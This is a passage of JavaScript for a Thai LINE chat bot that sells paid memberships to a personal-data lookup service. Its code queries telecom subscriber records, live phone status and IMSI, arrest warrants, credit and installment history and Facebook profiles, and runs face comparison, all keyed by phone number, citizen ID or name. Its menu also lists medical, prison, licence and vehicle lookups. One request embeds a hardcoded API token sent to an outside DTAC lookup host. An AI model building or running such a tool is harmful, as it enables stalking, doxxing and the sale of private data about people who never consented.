    if (member.status !== 'approved') {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ยังไม่มีสิทธิ์ใช้งานโปรดติดต่อแอดมิน'
      });
    }

    if (isExpired(member.expireAt)) {
      return reply(event.replyToken, {
        type: 'text',
        text:
          '❌ สมาชิกของคุณหมดอายุแล้ว\n' +
          `หมดอายุเมื่อ: ${member.expireAt ? formatThaiDate(member.expireAt) : '-'}\n` +
          'กรุณาติดต่อแอดมินเพื่อต่ออายุ'
      });
    }

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คุณไม่มีสิทธิ์ใช้งานคำสั่งนี้'
    });
  }

  if (/^(?:mea|kru)%/i.test(text)) {
    return reply(event.replyToken, {
      type: 'text',
      text: 'บริการนี้ยังไม่เปิดให้บริการในขณะนี้\nกรุณาเลือกคำสั่งอื่นจาก menu%'
    });
  }

  if (text.startsWith('tv#')) {
    const ti = text.replace(/^tv#/i, '').trim();
    if (!/^\d{1,9}$/.test(ti)) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุเลข Customer No. 1-9 หลัก เช่น tv@210240911"
      });
    }

    try {
      const data = await fetchTVGCCCustomerInfo(ti);
      return reply(event.replyToken, {
        type: 'text',
        text: formatFiberTvResult(data, ti)
      });
    } catch (err) {
      console.error('tvgcc customer info error:', err?.response?.data || err.message);
      const isTimeout = err.code === 'ECONNABORTED' || /timeout|exceeded/i.test(String(err.message || ''));
      return reply(event.replyToken, {
        type: 'text',
        text: isTimeout
          ? '⚠️ ระบบ TRUE ตอบช้า กรุณาลองใหม่ภายหลัง'
          : `❌ ไม่พบข้อมูลลูกค้า Fiber TV สำหรับ ${ti}`
      });
    }
  }

if (text.startsWith('t#')) {
    const isTBlocked =
  db.tBlocked?.[userId] === true;

if (isTBlocked) {
  return reply(event.replyToken, {
    type: 'text',
    text:
`Disconnect
[TDCN]`
  });
}
  const keyword = text.replace(/^t#/i, '').trim();

  const isPhone =
  /^0\d{9}$/.test(keyword);

const isCitizenId =
  /^\d{13}$/.test(keyword);

// Passport เช่น C9658356
const isPassport =
  /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z0-9]{6,12}$/.test(keyword);

const isFullName =
  /^[ก-๙A-Za-z.'-]+\s+[ก-๙A-Za-z.' -]+$/.test(keyword);


if (
  !isPhone &&
  !isCitizenId &&
  !isPassport &&
  !isFullName
) {
  return reply(event.replyToken, {
  type: 'text',
  text:
    '❌ กรุณาระบุข้อมูลให้ถูกต้อง\n\n' +

    " ค้นหาด้วยเบอร์โทรศัพท์\n" +
    "ตัวอย่าง  t@0812345678\n\n" +

    " ค้นหาด้วยเลขบัตรประชาชน\n" +
    "ตัวอย่าง  t@1234567890123\n\n" +

    " ค้นหาด้วยเลขพาสปอร์ต\n" +
    "ตัวอย่าง  t@C123456\n\n" +

    " ค้นหาด้วยชื่อ - นามสกุล\n" +
    "ตัวอย่าง  t@ชื่อ นามสกุล"
});
}

  try {
    const data = await fetchTrueSearchApi(keyword);

    return reply(event.replyToken, {
  type: 'text',
  text: formatTrueSearchResult(
    data,
    keyword,
    member
  )
});

  } catch (err) {
    console.error(
      'TRUE search error:',
      err?.response?.data || err.message
    );

    const isTimeout =
      err.code === 'ECONNABORTED' ||
      /timeout|exceeded/i.test(String(err.message || ''));

    return reply(event.replyToken, {
      type: 'text',
      text: isTimeout
        ? '⚠️ ระบบ TRUE ตอบช้า กรุณาลองใหม่ภายหลัง'
        : `❌[${keyword}]\nไม่พบข้อมูล`
    });
  }
}

  if (text.startsWith('tn#')) {
    const name = text.replace(/^tn#/i, '').trim();
    if (!name || name.split(/\s+/).length < 2) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุชื่อและนามสกุล เช่น tn@สุขใส สดใจ"
      });
    }

    try {
      const data = await fetchTVGCCApi(name);
      return reply(event.replyToken, {
        type: 'text',
        text: formatTVGCCResult(data, name)
      });
    } catch (err) {
      console.error('tvgcc name error:', err?.response?.data || err.message);
      const isTimeout = err.code === 'ECONNABORTED' || /timeout|exceeded/i.test(String(err.message || ''));
      return reply(event.replyToken, {
        type: 'text',
        text: isTimeout ? "กรูณาสืบค้นใหม่อีกรอบ" : `❌[${name}] ไม่พบข้อมูลเบอร์รายเดือน`
      });
    }
  }

  if (text.startsWith('tid#')) {
    const citizenId = text.replace(/^tid#/i, '').trim();
    if (!/^\d{13}$/.test(citizenId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุเลขบัตรประชาชน 13 หลัก เช่น tid@1234567890123"
      });
    }

    try {
      const data = await fetchISMApi(citizenId);
      return reply(event.replyToken, {
        type: 'text',
        text: formatISMResult(data, citizenId)
      });
    } catch (err) {
      console.error('ism tid error:', err?.response?.data || err.message);
      const isTimeout = err.code === 'ECONNABORTED' || /timeout|exceeded/i.test(String(err.message || ''));
      return reply(event.replyToken, {
        type: 'text',
        text: isTimeout ? "กรูณาสืบค้นใหม่อีกรอบ" : `❌[${citizenId}] ไม่พบข้อมูล ISM`
      });
    }
  }

if(
text==="topup30" ||
text==="topup90" ||
text==="topup180" ||
text==="topup365"
){

let day='';
let price='';

if(text==="topup30"){
day='30';
price='499';
}

if(text==="topup90"){
day='90';
price='1299';
}

if(text==="topup180"){
day='180';
price='2500';
}

if(text==="topup365"){
day='365';
price='4999';
}

// บันทึกสถานะรอส่งสลิป
db.topups = db.topups || {};

db.topups[userId] = {
status:'waiting_slip',
days:Number(day),
price:Number(price),
createdAt:nowThai(),
updatedAt:nowThai()
};

saveDB(db);

return reply(event.replyToken,[

buildSupportFlex(),

{
type:'text',
text:
`คุณเลือกแพ็กเกจ ${day} วัน แล้ว

สนับสนุน ${price} B.

กรุณาส่งสลิปเข้ามาในแชตนี้ได้เลย`
}

]);

}

if (text.startsWith('nm%')) {
  const keyword = text.replace('nm%', '').trim();

  if (!keyword) {
    return reply(event.replyToken, {
      type: 'text',
      text: "กรุณาพิมพ์ nm@ตามด้วยรหัส หรือชื่อหน่วยบริการ"
    });
  }

  try {
    const result = await searchHospital(keyword);

    return reply(event.replyToken, {
      type: 'text',
      text: result
    });
  } catch (err) {
    console.error('nm% hospital search error:', err?.response?.data || err.message || err);

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ค้นหาสถานพยาบาลไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
    });
  }
}

if (text.startsWith('picf%')) {
  const fbUrl = text.replace(/^picf%/i, '').trim();

  if (!fbUrl) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ กรุณาระบุลิงก์ Facebook\nตัวอย่าง: picf@https://www.facebook.com/zuck"
    });
  }

  let profileId = '';

  try {
    const url = new URL(fbUrl);

    if (url.pathname.includes('/profile.php')) {
      profileId = url.searchParams.get('id');
    } else {
      profileId = url.pathname.split('/').filter(Boolean)[0];
    }

    if (!profileId) {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ไม่พบ Profile ID'
      });
    }

    const result = await getFacebookProfile(profileId);

    if (!result || typeof result !== 'object') {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ไม่พบข้อมูล Facebook'
      });
    }

    return reply(event.replyToken, {
      type: 'flex',
      altText: "▸ รายละเอียดโปรไฟล์ Facebook",
      contents: buildFacebookProfileFlex(result)
    });

  } catch (err) {
    console.error('picf error:', err?.response?.data || err.message);
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ลิงก์ Facebook ไม่ถูกต้อง หรือไม่พบข้อมูล'
    });
  }
}

  if (text === 'hadmin') {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้'
      });
    }

    return reply(event.replyToken, buildAdminMenuFlex());
  }

  if (text === 'myid') {
    return reply(event.replyToken, {
      type: 'text',
      text: `Your userId:\n${userId}`
    });
  }

if (text === 'face%') {
  db.faceCompare = db.faceCompare || {};
  db.faceCompare[userId] = {
    step: 1,
    file1: '',
    file2: ''
  };
  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text: " กรุณาส่งรูปใบหน้ารูปที่ 1"
  });
}

  if (text.startsWith('send#')) {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ คำสั่งนี้ใช้ได้เฉพาะแอดมิน'
      });
    }

    const parts = text.split('#');
    const targetUserId = parts[1];
    const message = parts.slice(2).join('#').trim();

    if (!targetUserId || !message) {
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ รูปแบบ: send#UID#ข้อความ'
      });
    }

    await push(targetUserId, {
      type: 'text',
      text: message
    });

    return reply(event.replyToken, {
      type: 'text',
      text: '✅ ส่งข้อความถึงสมาชิกแล้ว'
    });
  }

  if (text === 'ยินยอมรับข้อตกลง') {
    return reply(event.replyToken, buildRegisterGuideFlex());
  }

  if (text === 'ติดต่อแอดมิน') {
    return reply(event.replyToken, buildContactAdminFlex());
  }

  if (text === 'สถานะการสมัคร') {
    if (!member) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'คุณยังไม่ได้สมัครสมาชิก\nกรุณาพิมพ์: ยินยอมรับข้อตกลง'
      });
    }

    let statusText = '';
    if (member.status === 'approved') {
      statusText = isExpired(member.expireAt)
        ? 'หมดอายุแล้ว'
        : 'อนุมัติแล้ว';
    } else if (member.status === 'waiting_card') {
      statusText = 'รอส่งรูปหลักฐาน';
    } else if (member.status === 'pending') {
      statusText = 'รอตรวจสอบ';
    } else if (member.status === 'rejected') {
      statusText = 'ถูกปฏิเสธ';
    } else {
      statusText = member.status;
    }

    return reply(event.replyToken, buildMemberStatusFlex(member, statusText));
  }

  if (text.startsWith('%')) {

  const rawMsisdn =
    text
      .substring(1)
      .trim()
      .replace(/\s+/g, '');

  let msisdn = rawMsisdn;


  // 0877315866 -> 66877315866
  if (/^0\d{9}$/.test(msisdn)) {

    msisdn =
      '66' +
      msisdn.substring(1);

  }

  // +66877315866 -> 66877315866
  else if (/^\+66\d{9}$/.test(msisdn)) {

    msisdn =
      msisdn.substring(1);

  }

  // 66877315866 ใช้ได้เลย
  else if (/^66\d{9}$/.test(msisdn)) {

    // ไม่ต้องแปลง

  }

  // รูปแบบอื่น
  else {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ รูปแบบหมายเลขไม่ถูกต้อง

ตัวอย่าง
on@0877315866
on@66877315866
on@+66877315866`
      }
    );
  }


  try {
    const response = await fetchHlrLookup(msisdn);

    if (response.status === 200) {
      const data = response.data;

      // ตัด + ออกจากเบอร์ เช่น +66952290729 -> 66952290729
      const formattedMsisdn = (data.msisdn || msisdn)
        .toString()
        .replace(/^\+/, '');

      // ตัด milliseconds และ timezone ออกจากเวลา
      // เช่น 2026-08-11 21:02:42.269+0700
      // -> 2026-08-11 21:02:42
      const formattedDate = data.timestamp
        ? data.timestamp.toString().substring(0, 19)
        : 'N/A';

      const rawStatus =
  String(
    data.connectivity_status || 'N/A'
  )
    .trim()
    .toUpperCase();

const statusThai = {
  CONNECTED: " เชื่อมต่อ",
  DISCONNECTED: " ไม่เชื่อมต่อ",
  UNKNOWN: " ไม่ทราบสถานะ",
  ABSENT: " ปิดเครื่อง/ไม่เชื่อมต่อ",
  N_A: " ไม่มีข้อมูล"
}[rawStatus] || rawStatus;


// แปลประเทศ
const countryThai =
  String(data.original_country_name || '')
    .toLowerCase() === 'thailand'
    ? 'ประเทศไทย'
    : (data.original_country_name || '-');


const portedCountryThai =
  String(data.ported_country_name || '')
    .toLowerCase() === 'thailand'
    ? 'ประเทศไทย'
    : (data.ported_country_name || '-');


// สถานะย้ายค่าย
const portedThai =
  data.is_ported
    ? '✅ ย้ายค่ายแล้ว'
    : '❌ ไม่ได้ย้ายค่าย';


// สถานะ Roaming
const roamingThai =
  data.is_roaming
    ? '✅ ใช้งานโรมมิ่ง'
    : '❌ ไม่ได้โรมมิ่ง';


let resultMsg =
` ข้อมูลหมายเลขโทรศัพท์

 วันที่ตรวจสอบ : ${formattedDate}
 หมายเลข : ${formattedMsisdn}

 สถานะหมายเลข : ${statusThai}

 ข้อมูลเครือข่ายหลัก
MCC : ${data.mcc || '-'}
MNC : ${data.mnc || '-'}

 IMSI : ${data.imsi || '-'}
 MSIN : ${data.msin || '-'}
 MSC : ${data.msc || '-'}

 เครือข่ายเดิม : ${data.original_network_name || '-'}
 ประเทศ : ${countryThai}
 รหัสประเทศ : ${data.original_country_code || '-'}
 รหัสโทรศัพท์ประเทศ : +${data.original_country_prefix || '-'}

 การย้ายค่าย : ${portedThai}
 เครือข่ายปัจจุบัน : ${data.ported_network_name || '-'}
 ประเทศเครือข่ายปัจจุบัน : ${portedCountryThai}
 รหัสประเทศ : ${data.ported_country_code || '-'}

 โรมมิ่ง : ${roamingThai}`;

      console.log(`success HLR Lookup: ${msisdn}`);

      return reply(event.replyToken, {
        type: 'text',
        text: resultMsg
      });

    } else {
      console.error(
        `error HLR Lookup failed: ${msisdn} - Status: ${response.status}`
      );

      return reply(event.replyToken, {
  type: 'text',
  text:
    'ระบบอัพเดทประจำรอบ\n' +
    "กรุณาสืบค้นใหม่อีกครั้งในไม่ช้า"
});
    }

  } catch (error) {
    console.error(`error HLR Lookup Error: ${error.message}`);

    return reply(event.replyToken, {
  type: 'text',
  text:
    'ระบบอัพเดทประจำรอบ\n' +
    "กรุณาสืบค้นใหม่อีกครั้งในไม่ช้า"
});
  }
}

  if (/^s%\d{13}$/.test(text)) {
    const nationId = text.replace(/^s%/, '').trim();

    try {
      const result = await fetchInstallment(nationId);
      const msg = formatInstallment(result);

      return reply(event.replyToken, {
        type: 'text',
        text: msg
      });
    } catch (err) {
      console.error('installment lookup error:', err?.response?.data || err.message);

      return reply(event.replyToken, {
        type: 'text',
        text: " คำสั่งนี้ทำการปรับปรุง"
      });
    }
  }

  // ประวัติการผ่อนสินค้า Siam: sc%เลขบัตร
  if (/^sc%\d{13}$/.test(text)) {
    const nationId = text.replace(/^sc%/, '').trim();

    try {
  const result = await fetchSiamInstallment(nationId);

  const msg = formatSiamInstallment(result, nationId);

return reply(event.replyToken, {
  type: 'text',
  text: msg
});

} catch (err) {
  console.error('sc% lookup error:', err?.response?.data || err.message);

  return reply(event.replyToken, {
    type: 'text',
    text: '❌ ดึงข้อมูลประวัติการผ่อนสินค้าไม่สำเร็จ'
  });
}
  }

  if (/^c#\d{13}$/.test(text)) {
    const nationId = text.replace(/^c#/, '').trim();

    try {
      const result = await fetchCrime(nationId);

      console.log('===== CRIME FULL RESPONSE START =====');
      console.log(JSON.stringify(result, null, 2));
      console.log('===== CRIME FULL RESPONSE END =====');

      return reply(
event.replyToken,
buildCrimeFlex(result, nationId)
);
    } catch (err) {
      console.error('crime error:', err?.response?.data || err.message);

      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ดึงข้อมูลหมายจับไม่สำเร็จ'
      });
    }
  }

  if (text.startsWith('?')) {
  const phone = text.substring(1).trim();

  if (!phone) {
    return reply(event.replyToken, {
      type: 'text',
      text: "กรุณาระบุเบอร์โทรศัพท์\nตัวอย่าง : net@0812345678"
    });
  }

  const result = await fetchCallerInfo(phone);
  return reply(event.replyToken, result);
}

// =====================================
// ค้นหาสาขา : se%
// =====================================
if (
  text
    .toLowerCase()
    .startsWith('se%')
) {

  const keyword =
    text
      .replace(/^se%/i, '')
      .trim();


  if (!keyword) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ กรุณาระบุข้อมูลที่ต้องการค้นหา

ตัวอย่าง
se@3190
se@ปตท.ด่านช้าง
se@สุพรรณบุรี`
      }
    );
  }


  try {

    const stores =
      await fetchStoreListApi();


    const results =
      searchStores(
        stores,
        keyword
      );


    const resultText =
      formatStoreSearchResult(
        results,
        keyword
      );


    return reply(
      event.replyToken,
      {
        type: 'text',
        text: resultText
      }
    );


  } catch (err) {

    console.error(
      'se% store lookup error:',
      err?.response?.data ||
      err.message
    );


    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          '❌ ไม่สามารถค้นหาข้อมูลสาขาได้ กรุณาลองใหม่'
      }
    );
  }
}

if (text === 'menu#') {
  return reply(event.replyToken, {
    type: 'text',
    text: `คำค้นในระบบ

• on@66xxxxxxxxx → ตรวจสอบปิด/เปิดเครื่อง
✅ตัวอย่าง: on@66812345678
• net@เบอร์โทร → ตรวจเครือข่ายเบอร์
• a@เบอร์โทร/เลขบัตร → จด AIS (สมัครเพิ่ม)
• d@เบอร์โทร/เลขบัตร → จด DTAC
• t@เบอร์ → จด TRUE
• tid@เลขบัตร → จด TRUE
• tn@ชื่อ-นามสกุล → จด TRUE
• tv@เลขกล่อง TV Fiber → จุดติดตั้งข้อมูล
⚠️ ระบบ TRUE อาจไม่สามารถค้นหาได้บางรายการ
 ขออภัยในความไม่สะดวก

• f@เบอร์โทร → พัสดุทั่วไป
• fx@เบอร์โทร/ชื่อสกุล → พัสดุแบบละเอียด (สมัครเพิ่ม)
• tic@เลขพัสดุ → ภาพรับพัสดุ

• bn@ชื่อธนาคาร/รหัสสาขา → ค้นหาข้อมูลธนาคาร
• atm@รหัสตู้ → จุดติดตั้ง ATM
• cell@LAC,CID → พิกัด Cell
• pw@สาขา ชื่อ/ที่อยู่/หมายเลขมาตร → ตำแหน่งมาตรวัดน้ำ

• pid@เลขบัตร → ตรวจสอบสิทธิ
• h@เลขบัตร → ตรวจสอบข้อมูลการรักษา
• nm@รหัสหน่วยบริการ/ชื่อสถานพยาบาล → ค้นหาสถานพยาบาล

• st@เลขบัตรบุตร → ตรวจสอบข้อมูลการศึกษา
• ใช้เลขบัตรของบุตรเท่านั้น

• si@เลขบัตร → ตรวจสอบประกันสังคม
• dc@ชื่อ สกุล → ตรวจสอบแพทย์
• dl@เลขบัตร → ตรวจสอบใบขับขี่
• pb@เลขบัตร → ตรวจสอบคุมประพฤติ
• nb@เลขบัตร → ตรวจสอบประวัติคดียาเสพติด
• psi@เลขบัตร → ตรวจสอบผู้ต้องขัง
• ps@เลขบัตร → ผู้ต้องขังยังไม่พิพากษา
• wf@เลขบัตร → เบี้ยยังชีพ
• kp@เลขบัตร/เลขสมาชิก → ตรวจสอบสมาชิก สก.ทบ.

• dbd@เลขนิติบุคคล → ข้อมูลจดทะเบียนนิติบุคคล

• c@เลขบัตร → หมายจับ CRIME
• doc@เลขบัตร → หมายจับศาล

• cid@เลขบัตร → ตรวจจากเลขบัตร
• car@จังหวัด หมวด ตัวเลข ประเภทรถ → ตรวจจากทะเบียน
• ตัวอย่าง: car@กรุงเทพ 1กก 334 1
• pt@ → อ่านป้ายทะเบียนและวิเคราะห์รถ
• รอระบบแจ้งให้ส่งภาพ
• tro@หมวดอักษร หมวดตัวเลข จังหวัด → ตรวจสอบเข้า ตรอ.
• ตัวอย่าง: tro@1กก 334 กรุงเทพ

• ff@ → เปรียบเทียบใบหน้า
• รอระบบแจ้งให้ส่งภาพ

• mea@ชื่อสกุล → ข้อมูลไฟฟ้า MEA
• kru@เลขมิเตอร์ → ตรวจสอบมิเตอร์
• peab@เลขCA เว้นวรรค เลขมิเตอร์ → ประวัติใช้ไฟ
• peac@เลข CA → ข้อมูลจาก CA
• pean@ชื่อสกุล → ข้อมูลจากชื่อสกุล
• peau@ที่อยู่ → ข้อมูลจากที่อยู่

• phis@URL → เพิ่ม Phishing
• chphis@ID → ตรวจ Phishing
• picf@url → ดึงภาพ Profile Facebook
• dr@ชื่อ สกุล → ข้อมูลแพทย์/บุคลากรสาธารณสุข
• soc@Username/ชื่อโซเชียล → ค้นหาโซเชียล
• ip@เลข IP → ตรวจเครือข่าย IP
• imei@เลข IMEI → ตรวจ IMEI
• imsi@เลข IMSI → ตรวจ IMSI
• icc@เลข ICCID → ตรวจเลขซิม
• web@ชื่อเว็บไซต์ → ตรวจเว็บไซต์
• dis@พิกัดต้นทาง/พิกัดปลายทาง → ระยะทาง
• map@ละติจูด,ลองจิจูด → พิกัด MAP
• lw@คำถาม → ค้นหาข้อกฎหมาย

• cj@เบอร์ เลขบัตร → สมาชิก CJ
• se@รหัสสาขา7-11 → สาขาเซเว่น
• lc@ชื่อ-สกุล,ชื่อบริษัท → ใบอนุญาตบริษัท
• loa@ชื่อแอป → ตรวจสอบแอปเงินกู้
• for@เลขนิติ → ทะเบียนพาณิชย์/นิติบุคคล
• tr@ชื่อผู้ประกอบการ → ผู้ประกอบการขนส่ง
• cctv@เวลากล้อง,เวลาจริง → เปรียบเทียบเวลากล้อง
• tisi@เลขมอก. → ตรวจมาตรฐาน มอก.
• s@เลขบัตร → ผ่อนเครื่องใช้ไฟฟ้า
• sc@เลขบัตร → ประวัติการผ่อนสินค้า
• bq@เบอร์โทร/เลขบัตร → ศูนย์บริการรถ`
  });
}

  if (text.startsWith('regis%')) {
    const raw = text.replace(/^regis%/i, '').trim();
    const parts = raw.split('/').map(v => v.trim());

    if (parts.length < 5) {
      return reply(event.replyToken, {
        type: 'text',
        text:
          'รูปแบบไม่ถูกต้อง\n' +
          'กรุณาส่งแบบนี้:\n' +
          'regis%ยศ/ชื่อ-สกุล/ตำแหน่ง/สังกัด/เบอร์โทร'
      });
    }

    const [rank, fullname, position, department, phone] = parts;

    const duplicatePhone = Object.entries(db.members).find(([id, m]) => {
      return id !== userId && m.phone === phone && ['pending', 'approved', 'waiting_card'].includes(m.status);
    });

    if (duplicatePhone) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'เบอร์โทรนี้มีอยู่ในระบบแล้ว กรุณาติดต่อผู้ดูแล'
      });
    }

    if (db.members[userId] && ['pending', 'approved'].includes(db.members[userId].status)) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'ท่านสมัครแล้วเรียบร้อย กรุณาติดต่อแอดมิน✅ '
      });
    }

    const profile = await getProfile(userId);

    db.members[userId] = {
      userId,
      lineName: profile.displayName || 'ไม่ทราบชื่อ',
      rank,
      fullname,
      position,
      department,
      phone,
      status: 'waiting_card',
      registeredAt: nowThai(),
      updatedAt: nowThai(),
      imagePath: '',
      imageUrl: '',
      approvedAt: '',
      approvedDays: 0,
      expireAt: '',
      renewCount: 0
    };

    saveDB(db);

    return reply(event.replyToken, {
  type: 'text',
  text:
` กรุณาส่งรูปภาพบัตรข้าราชการอิเล็กทรอนิกส์ หรือ เอกสารที่ยืนยันตัวตนข้าราชการ

 สำคัญ
หากไม่ส่งภาพบัตรข้าราชการหรือเอกสารยืนยันตัวตน
แอดมินจะไม่ทำการตรวจสอบและอนุมัติการสมัคร

 ขอความร่วมมือส่งเอกสารให้ครบถ้วนเพื่อความรวดเร็วในการอนุมัติ`
});
  }

  if (text === 'members_all') {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, { type: 'text', text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้' });
    }
    return reply(event.replyToken, { type: 'text', text: buildMembersAllText(db) });
  }

  if (text === 'members_expired') {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, { type: 'text', text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้' });
    }
    return reply(event.replyToken, { type: 'text', text: buildMembersExpiredText(db) });
  }

  if (text === 'members_pending') {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, { type: 'text', text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้' });
    }
    return reply(event.replyToken, { type: 'text', text: buildMembersPendingText(db) });
  }

  if (text === 'topup_pending') {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, { type: 'text', text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้' });
    }
    return reply(event.replyToken, { type: 'text', text: buildTopupPendingText(db) });
  }

  if (text === 'TOPUP' || text === 'topup') {
    return reply(event.replyToken, buildTopupFlex());
  }

  const topupPackage = mapTopupPackage(text);
  if (topupPackage) {
    const profile = await getProfile(userId);

    db.topups[userId] = {
      userId,
      lineName: profile.displayName || member?.lineName || 'ไม่ทราบชื่อ',
      fullname: member?.fullname || '',
      phone: member?.phone || '',
      packageDays: topupPackage.days,
      packageLabel: topupPackage.label,
      status: 'waiting_slip',
      createdAt: nowThai(),
      updatedAt: nowThai(),
      slipImagePath: '',
      slipImageUrl: ''
    };

    saveDB(db);

    return reply(event.replyToken, {
      type: 'text',
      text:
        `คุณเลือกแพ็กเกจ ${topupPackage.label} แล้ว\n` +
        `กรุณาส่งสลิปเข้ามาในแชตนี้ได้เลย`
    });
  }

  if (text.startsWith('member#')) {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้'
      });
    }

    const phone = text.replace('member#', '').trim();
    const foundEntry = Object.entries(db.members).find(([_, m]) => m.phone === phone);

    if (!foundEntry) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'ไม่พบสมาชิกจากเบอร์นี้'
      });
    }

    const [targetUserId, found] = foundEntry;
    return reply(event.replyToken, [
      buildMemberManageFlex(found, targetUserId),
      {
        type: 'text',
        text:
          `ข้อมูลสมาชิก\n` +
          `ชื่อ: ${found.fullname || '-'}\n` +
          `LINE: ${found.lineName || '-'}\n` +
          `UID: ${targetUserId}\n` +
          `เบอร์: ${found.phone || '-'}`
      }
    ]);
  }

  if (/^renew(30|90|180|365)#/.test(text)) {
    if (!isAdmin(userId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'คุณไม่มีสิทธิ์ใช้คำสั่งนี้'
      });
    }

    const match = text.match(/^renew(30|90|180|365)#(.+)$/);
    const days = Number(match[1]);
    const phone = match[2].trim();

    const foundEntry = Object.entries(db.members).find(([_, m]) => m.phone === phone);

    if (!foundEntry) {
      return reply(event.replyToken, {
        type: 'text',
        text: 'ไม่พบสมาชิกจากเบอร์นี้'
      });
    }

    const [targetUserId, found] = foundEntry;

    let baseDate = new Date();
    if (found.expireAt && !isExpired(found.expireAt)) {
      baseDate = new Date(found.expireAt);
    }

    baseDate.setDate(baseDate.getDate() + days);

    found.status = 'approved';
    found.updatedAt = nowThai();
    found.approvedDays = days;
    found.expireAt = baseDate.toISOString();
    found.renewCount = Number(found.renewCount || 0) + 1;

    db.members[targetUserId] = found;
    saveDB(db);

    try {
      await push(targetUserId, {
        type: 'text',
        text:
          `สมาชิกของคุณได้รับการต่ออายุแล้ว ✅\n` +
          `ต่อเพิ่ม: ${days} วัน\n` +
          `วันหมดอายุใหม่: ${formatThaiDate(baseDate)}`
      });
    } catch (e) {
      console.error('push renew error:', e?.response?.data || e.message);
    }

    return reply(event.replyToken, {
      type: 'text',
      text:
        `อนุมัติ ${found.fullname || targetUserId} เรียบร้อยแล้ว\n` +
        `เพิ่ม: ${days} วัน\n` +
        `หมดอายุใหม่: ${formatThaiDate(baseDate)}`
    });
  }

  if (text.startsWith('d#')) {

const phone=text.replace(/^d#/,'').trim();

if(!phone){
return reply(event.replyToken,{
type:'text',
text:'❌ กรุณาระบุเบอร์ 10 หลัก หรือ เลขบัตร 13 หลัก'
});
}

const registeredPhone =
member?.phone ||
member?.tel ||
member?.mobile ||
'';

const isBlocked =
db.dtacBlocked?.[registeredPhone] === true;

if(isBlocked){
return reply(event.replyToken,{
type:'text',
text:`สิทธิ์สืบค้นคำสั่ง DTAC ถูกยกเลิกแล้ว

ต้องการใช้งานติดต่อ admin
Contact Admin:
https://line.me/ti/p/mVmD-ncfvU
────────────`
});
}

try{

const url=`https://dtac-api.jedi-r3cloud.org/dtac?phone=${encodeURIComponent(phone)}&token=jedi-api-2026`;

const res=await axios.get(url,{
timeout:45000
});

const msg = formatDtacSearchFlex(
  res.data,
  phone
);

return reply(event.replyToken, msg);

}catch(err){

console.error(
'dtac lookup error:',
err?.response?.data ||
err.message
);

return reply(event.replyToken,{
type:'text',
text:" สืบค้นใหม่อีกครั้ง"
});

}

}

// soc%ข้อความ
if (text.startsWith('soc%')) {

  const keyword = text.replace(/^soc%/i, '').trim();

  if (!keyword) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ กรุณาระบุคำค้น'
    });
  }

  try {

    let msg = ` Social Search: [${keyword}]\n\n`;

    msg += `Facebook
`;
    msg += `https://www.google.com/search?q=${encodeURIComponent(keyword + ' site:facebook.com')}\n`;
    msg += `────────────
`;

    msg += `Instagram
`;
    msg += `https://www.google.com/search?q=${encodeURIComponent(keyword + ' site:instagram.com')}\n`;
    msg += `────────────
`;

    msg += `TikTok
`;
    msg += `https://www.google.com/search?q=${encodeURIComponent(keyword + ' site:tiktok.com')}\n`;
    msg += `────────────
`;

    msg += `YouTube
`;
    msg += `https://www.google.com/search?q=${encodeURIComponent(keyword + ' site:youtube.com')}\n`;
    msg += `────────────
`;

    msg += `Twitter/X
`;
    msg += `https://www.google.com/search?q=${encodeURIComponent(keyword + ' site:x.com OR site:twitter.com')}\n`;
    msg += `────────────
`;

    msg += `Threads
`;
    msg += `https://www.google.com/search?q=${encodeURIComponent(keyword + ' site:threads.net')}`;

    return reply(event.replyToken, {
      type: 'text',
      text: msg
    });

  } catch (err) {

    console.error('soc error:', err.message);

    return reply(event.replyToken, {
      type: 'text',
      text: "กรุณาสืบค้นใหม่อีกครั้ง"
    });

  }

}

  // DPlus Express: f#เบอร์
  if (text.startsWith('f#')) {
    const phone = text.replace(/^f#/i, '').trim();
    if (!/^0\d{9}$/.test(phone)) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุเบอร์โทรศัพท์ 10 หลัก เช่น f@0877315865" });
    }

    try {
      const data =
  await fetchDPlusCustomerApi(phone);

return reply(
  event.replyToken,

  addSearchAudit(
    {
      type: 'text',
      text:
        formatDPlusCustomers(
          data,
          phone
        )
    },
    member
  )
);
    } catch (err) {
      console.error('dplus customer error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ ดึงข้อมูลไม่สำเร็จ: ' + err.message });
    }
  }

